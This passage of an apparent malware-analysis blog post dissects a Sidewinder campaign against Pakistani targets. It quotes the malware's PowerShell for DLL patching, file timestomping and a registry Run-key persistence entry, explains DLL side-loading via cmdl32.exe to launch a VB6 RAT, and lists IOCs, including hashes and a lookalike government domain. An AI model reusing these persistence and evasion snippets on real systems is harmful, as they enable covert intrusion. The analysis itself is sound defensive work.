os oi oj ok ot om on oo gw bl">after:</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov py"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*gskxEMV2wHIwHkcKEQu-NQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*gskxEMV2wHIwHkcKEQu-NQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*gskxEMV2wHIwHkcKEQu-NQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*gskxEMV2wHIwHkcKEQu-NQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*gskxEMV2wHIwHkcKEQu-NQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*gskxEMV2wHIwHkcKEQu-NQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*gskxEMV2wHIwHkcKEQu-NQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="390" loading="lazy" role="presentation"/></picture></div></div></figure><p id="48ef" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">In fact:</p><p id="a0e4" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The powershell modify the dll to add $lines</p><p id="32ff" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">and $lines</p><blockquote class="pt pu pv"><p id="45f6" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$line = new-object byte[] 64;<br/>$buf6 =[Byte[]] (,0x23 * 64);<br/>$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);<br/>[array]::copy($cbytes,$line,$cbytes.length);</p></blockquote><p id="8e83" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">and $cmdLine</p><blockquote class="pt pu pv"><p id="642b" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$bin =Winset.exe</p><p id="175a" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);<br/>$cmdLine = $bin+ “ “ +$cmdLine;<br/>}</p></blockquote><p id="28ce" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">like in the dll: .string “Winset.exe -0000000100001223</p><p id="924e" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">So we have in the same folder: Winset\Config</p><ul class=""><li id="ccf4" class="nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo pz qa qb bl">Winset.exe (part1 modified and decoded)is a fake Windows Security Configuration Editor Command Tool</li><li id="170f" class="nr ns hd nt b nu qc nw nx ny qd oa ob oc qe oe of og qf oi oj ok qg om on oo pz qa qb bl">cmpbk32.dll (part2 modified and decoded)</li><li id="9727" class="nr ns hd nt b nu qc nw nx ny qd oa ob oc qe oe of og qf oi oj ok qg om on oo pz qa qb bl">57146C96.dll (vb virtual machine)</li><li id="423f" class="nr ns hd nt b nu qc nw nx ny qd oa ob oc qe oe of og qf oi oj ok qg om on oo pz qa qb bl">cmdl32.exe (executable of windows)</li></ul><p id="e1ff" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The powershell change timestamps of files copied:</p><blockquote class="pt pu pv"><p id="a795" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">updt -t $binPathdll -b $cmdl32path</p><p id="84da" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">updt -t $binPath -b $cmdl32path</p><p id="1537" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">function updt($t, $b){<br/> (ls $t).LastWriteTime = (ls $b).LastWriteTime<br/> (ls $t).CreationTime = (ls $b).CreationTime<br/> (ls $t).LastAccessTime = (ls $b).LastAccessTime<br/>}</p></blockquote><h2 id="4f4a" class="ml mm hd bg mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni bl">Persistance</h2><p id="2a4d" class="pw-post-body-paragraph nr ns hd nt b nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo gw bl">The persistant is a hkey run very basic with the path of the dll in parameter:</p><p id="2963" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$run = ‘HKCU:Software\Microsoft\Windows\CurrentVersion\Run\’;</p><p id="9dd6" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;</p><p id="09a4" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">To reload cmpbk32.dll at each reboot of the system and execute the dllmain of the dll.</p><h2 id="d509" class="ml mm hd bg mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni bl">Loading Chain</h2><p id="ce69" class="pw-post-body-paragraph nr ns hd nt b nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo gw bl">The powershell launch cmdl32.exe (“Connection Manager Phonebook Downloader”) trusted by AV because it’s develloped by Microsoft.</p><p id="8812" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">this exe used: cmpbk32.dll</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div class="ou ov qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 1100w, https://miro.medium.com/v2/resize:fit:1268/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 1268w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 634px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*NyF5UD6MIWldtbpEr3y5IQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*NyF5UD6MIWldtbpEr3y5IQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*NyF5UD6MIWldtbpEr3y5IQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*NyF5UD6MIWldtbpEr3y5IQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*NyF5UD6MIWldtbpEr3y5IQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*NyF5UD6MIWldtbpEr3y5IQ.png 1100w, https://miro.medium.com/v2/resize:fit:1268/1*NyF5UD6MIWldtbpEr3y5IQ.png 1268w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 634px"/><img alt="" class="bi ls po c" width="634" height="162" loading="lazy" role="presentation"/></picture></div></figure><p id="f4e3" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">So when cmdl32.exe is launched cmpbk32.dll is loaded. (in the same directory, side loading)</p><p id="18a6" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">the entrypoint is exectuted.</p></div></div><div class="pc"><div class="ac ci"><div class="ln qi lo qj lp qk cm ql cn qm cp bi"><figure class="ox oy oz pa pb pc qo qp paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov qn"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*fQ8cDP8CRj8EmmzfKMnXRw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*fQ8cDP8CRj8EmmzfKMnXRw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*fQ8cDP8CRj8EmmzfKMnXRw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*fQ8cDP8CRj8EmmzfKMnXRw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*fQ8cDP8CRj8EmmzfKMnXRw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*fQ8cDP8CRj8EmmzfKMnXRw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*fQ8cDP8CRj8EmmzfKMnXRw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bi ls po c" width="1000" height="769" loading="lazy" role="presentation"/></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gi gj gk gl"><p id="cce4" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The important part is:</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov qq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*eSBQqIXyF-U2Qq51FYXsMg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*eSBQqIXyF-U2Qq51FYXsMg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*eSBQqIXyF-U2Qq51FYXsMg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*eSBQqIXyF-U2Qq51FYXsMg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*eSBQqIXyF-U2Qq51FYXsMg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*eSBQqIXyF-U2Qq51FYXsMg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*eSBQqIXyF-U2Qq51FYXsMg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="168" loading="lazy" role="presentation"/></picture></div></div></figure><p id="1fc1" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The function sub.Winset.exe__0000000100001223_0 launches Winset.exe the real RAT like this “Winset.exe -0000000100001223” ; len=2</p></div></div></div><div class="ac ci qr qs qt qu" role="separator"><span class="qv by bn qw qx qy"></span><span class="qv by bn qw qx qy"></span><span class="qv by bn qw qx"></span></div><div class="gw gx gy gz ha"><div class="ac ci"><div class="cp bi gi gj gk gl"><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov qz"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*cyKfNUGcZs3qFmxqlZYEww.png 640w, https://miro.medium.com/v2/resize:fit:720/1*cyKfNUGcZs3qFmxqlZYEww.png 720w, https://miro.medium.com/v2/resize:fit:750/1*cyKfNUGcZs3qFmxqlZYEww.png 750w, https://miro.medium.com/v2/resize:fit:786/1*cyKfNUGcZs3qFmxqlZYEww.png 786w, https://miro.medium.com/v2/resize:fit:828/1*cyKfNUGcZs3qFmxqlZYEww.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*cyKfNUGcZs3qFmxqlZYEww.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*cyKfNUGcZs3qFmxqlZYEww.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="364" loading="lazy" role="presentation"/></picture></div></div></figure><p id="5f0d" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Winset.exe is RAT developed in VB6.</p><p id="0754" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">You can find an complete analysis here: <a class="ah ps" href="https://s.tencent.com/research/report/479.html" rel="noopener ugc nofollow" target="_blank">https://s.tencent.com/research/report/479.html</a></p><h2 id="9fab" class="ml mm hd bg mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni bl">Threat Intelligence</h2><p id="0e1b" class="pw-post-body-paragraph nr ns hd nt b nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo gw bl">We have the TTPs described in Tencent with the same phases.</p><p id="5363" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Sidewinder is a Indian Group targeting Pakistan military infrastructure.</p><p id="0430" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The content of the RTF is cleary oriented to Navy Pakistani.</p><p id="fdad" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">If we check the infrastructure of the attackers:</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov ra"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*UNB3nsU-2fey_uCyR0BC4w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*UNB3nsU-2fey_uCyR0BC4w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*UNB3nsU-2fey_uCyR0BC4w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*UNB3nsU-2fey_uCyR0BC4w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*UNB3nsU-2fey_uCyR0BC4w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*UNB3nsU-2fey_uCyR0BC4w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*UNB3nsU-2fey_uCyR0BC4w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="721" loading="lazy" role="presentation"/></picture></div></div></figure><p id="366b" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">We have <a class="ah ps" href="http://www.nadra.gov.pk.d-dns.co" rel="noopener ugc nofollow" target="_blank">www.nadra.gov.pk.d-dns.co</a> cleary targetted.</p><p id="9348" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The nadra is the National Database of and Registration Authority.</p><p id="8c1a" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">If you check the metada of RTF, Rashid Memorial is the author of the document.</p><p id="3030" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">This name is really known by the navy pakistani because “Rashid Memorial Welfare Organization (RMWO) was set up by a group of dedicated retired PAF officers in 1998 in memory of Flt. Lt. Rashid Ahmed Khan, who embraced ‘Shahadat’ on 13th December, 1997 when his aircraft caught fire above a densely populated area.”</p><h2 id="b8d4" class="ml mm hd bg mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni bl">IOCs</h2><p id="0510" class="pw-post-body-paragraph nr ns hd nt b nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo gw bl">File RTF:</p><p id="43cc" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488</p><p id="d710" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">08b9b5b7592004b8733544df1029e2fc085d82db1ba488a43830df49bbbc73b6</p><p id="e810" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">hta:</p><p id="18d8" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">b8cbdb36ccd666adaf2ba3628cc79578d3a05119c71dce1bb16aa39e56dea3cc</p><p id="3cfe" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Executables:</p><p id="5ec7" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">8315956b587032db14ba4e700400dffeaeb4119ef509ecf0df1bb4e80a496b59 (cmpbk32.dll)</p><p id="841f" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">13497aab3521abbaa654b51f375114e419b1bb774caa8c67cf52775095b17423 (winset.exe)</p><p id="3b71" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Sandbox execution:</p><div class="rb rc rd re rf rg"><a href="https://app.any.run/tasks/779ba068-a9d5-490b-a1ec-7ebaa81e5d57?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="rh ac cb"><div class="ri ac cv ci cd rj"><h2 class="bg he rk ab pk rl rm rn ro rp rq hc bl">892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488.rtf (MD5…</h2><div class="rr m"><h3 class="bg b rk ab pk rl rm rn ro rp rq eb">Interactive malware hunting service. Any environments ready for live testing most type of threats. Without install…</h3></div><div class="rs m"><p class="bg b ec ab pk rl rm rn ro rp rq eb">app.any.run</p></div></div><div class="rt m"><div class="ru m rv rw rx rt ry ls rg"></div></div></div></a></div><h2 id="e047" class="ml mm hd bg mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni bl">Credits:</h2><p id="054f" class="pw-post-body-paragraph nr ns hd nt b nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo gw bl">Thanks to Benjamin Piot for exchange about this cases !</p></div></div></div></div></section></div></div></article></div><div class="ac ci"><div class="cp bi gi gj gk gl"><div class="rz sa ac ja"><div class="rr ac"><a class="sb ak ao aq" href="https://medium.com/tag/threat-intelligence?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><div class="sc fr de sd gn se sf bg b bh ab bl pm">Threat Intelligence</div></a></div><div class="rr ac"><a class="sb ak ao aq" href="https://medium.com/tag/malware-analysis?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><div class="sc fr de sd gn se sf bg b bh ab bl pm">Malware Analysis</div></a></div></div></div></div><div class="m"></div><footer class="sg sh si sj sk ac r sl sm c"><div 